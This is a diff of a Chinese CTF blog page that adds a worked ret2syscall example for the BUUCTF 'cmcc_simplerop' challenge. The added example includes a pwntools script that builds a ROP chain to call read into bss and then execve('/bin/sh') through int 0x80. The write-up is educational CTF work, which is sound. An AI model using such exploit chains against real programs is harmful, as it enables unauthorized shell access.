@@ -42,14 +42,21 @@
 <meta property="og:site_name" content="淋着雨">
 <meta property="og:description" content="引言ret2syscall是很久之前就碰到的了，只不过当时的状态是碰到这样的题了，不懂，就直接找网上的wp糊弄着好像学会了，但其实并未入脑中。直到已经在学堆的内容又一次碰到ret2syscall的题发现依然无法独立完成，我明白是时候回头看看那些没有真正掌握的知识点了。 64位与32位下ret2syscall的区别   特性 32位(x86) 64位(x64)    触发系统调用的指令 int 0x">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image1.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image2.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image3.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image4.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image5.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image6.png">
 <meta property="article:published_time" content="2026-03-13T13:59:28.000Z">
-<meta property="article:modified_time" content="2026-03-13T14:11:29.710Z">
+<meta property="article:modified_time" content="2026-03-14T13:03:07.310Z">
 <meta property="article:author" content="淋着雨">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="stack">
 <meta property="article:tag" content="syscall">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image1.png">
   
   
   
@@ -222,7 +229,7 @@
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8E32%E4%BD%8D%E4%B8%8Bret2syscall%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">64位与32位下ret2syscall的区别</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8E32%E4%BD%8D%E4%B8%8Bret2syscall%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">64位与32位下ret2syscall的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li></ol>
   
 </div>
 </div>
@@ -311,7 +318,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-03-13T13:59:28.000Z" itemprop="datePublished">2026-03-13</time>
-    <time style="display: none;" id="post-update-time">2026-03-13</time>
+    <time style="display: none;" id="post-update-time">2026-03-14</time>
   </span>
   
 </div>
@@ -370,6 +377,14 @@
 <td>rdx</td>
 </tr>
 </tbody></table>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这里以BUUCTF中的“cmcc_simplerop”这道题为例。查看程序信息，可知程序是32位静态链接的，且开启了NX(栈上不可执行)，考虑构造ROP链。由于是静态链接，ret2libc无法实现，考虑其他方法，比方说ret2syscall。</p>
+<p><img src="image1.png" alt="程序信息"></p>
+<p>查看程序各个段的信息，看到bss段可读可写；查看gadgets信息，可以找到“pop eax; ret”以及“pop edx; pop ecx; pop ebx; ret”这几个片段，那么只要能够让eax&#x3D;11，ebx&#x3D;”&#x2F;bin&#x2F;sh\0”，ecx&#x3D;0，edx&#x3D;0，并返回到int 0x80处触发系统调用，就能够让程序执行“execve(“&#x2F;bin&#x2F;sh\0”)”来控制程序。</p>
+<p><img src="image2.png" alt="段信息"><br><img src="image3.png" alt="gadget"><br><img src="image4.png" alt="gadget"><br><img src="image5.png" alt="gadget"></p>
+<p>我们构造payload的思路如下：通过栈溢出跳转到read函数写入“&#x2F;bin&#x2F;sh\0”到bss段，接着通过gadgets清理栈上内容并设置寄存器信息，最后触发系统调用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote()</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">bss = <span class="number">0x080EAF80</span></span><br><span class="line">read = <span class="number">0x806CD50</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span> + <span class="number">4</span>) + p32(read) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">11</span>) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这题有一个雷点，就是ida所判断出的缓冲区大小是错误的。我们需要通过gdb动态调试，往程序写入内容并查看栈上信息，判断真正的偏移量。<br><img src="image6.png" alt="gdb"></p>
 
       
     </div>
@@ -397,7 +412,7 @@
       
         
         
-          <img data-src="/covers/【哲风壁纸】cg美女-CG美女插图.png" data-sizes="auto" alt="ret2libc" class="lazyload">
+          <img data-src="/covers/【哲风壁纸】圣杯战争-日本动漫.png" data-sizes="auto" alt="ret2libc" class="lazyload">
         
       
       <a href="/2026/02/15/ret2libc/"></a>
@@ -476,10 +491,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        1.9k
+        2.2k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        00:07
+        00:08
       </div>
     
     
@@ -512,7 +527,7 @@
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8E32%E4%BD%8D%E4%B8%8Bret2syscall%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">64位与32位下ret2syscall的区别</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8E32%E4%BD%8D%E4%B8%8Bret2syscall%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">64位与32位下ret2syscall的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li></ol>
   
 </div>
 </div>
@@ -664,7 +679,7 @@
           description: "",
           stripContent: "引言ret2syscall是很久之前就碰到的了，只不过当时的状态是碰到这样的题了，不懂，就直接找网上的wp糊弄着好像学会了，但其实并未入脑中。直到已经在学堆的内容又一次碰到ret2syscall的题发现依然无法独立完成，我明白是时候回头看看那些没有真正掌握的知识点了。 64位与32位下ret2syscall的区别   特性 32位(x86) 64位(x64)    触发系统调用的指令 int 0x80 syscall   存放系统调用号的寄存器 eax rax   execve的系统调用号 11",
           date: "Fri Mar 13 2026 21:59:28 GMT+0800",
-          updated: "Fri Mar 13 2026 22:11:29 GMT+0800",
+          updated: "Sat Mar 14 2026 21:03:07 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
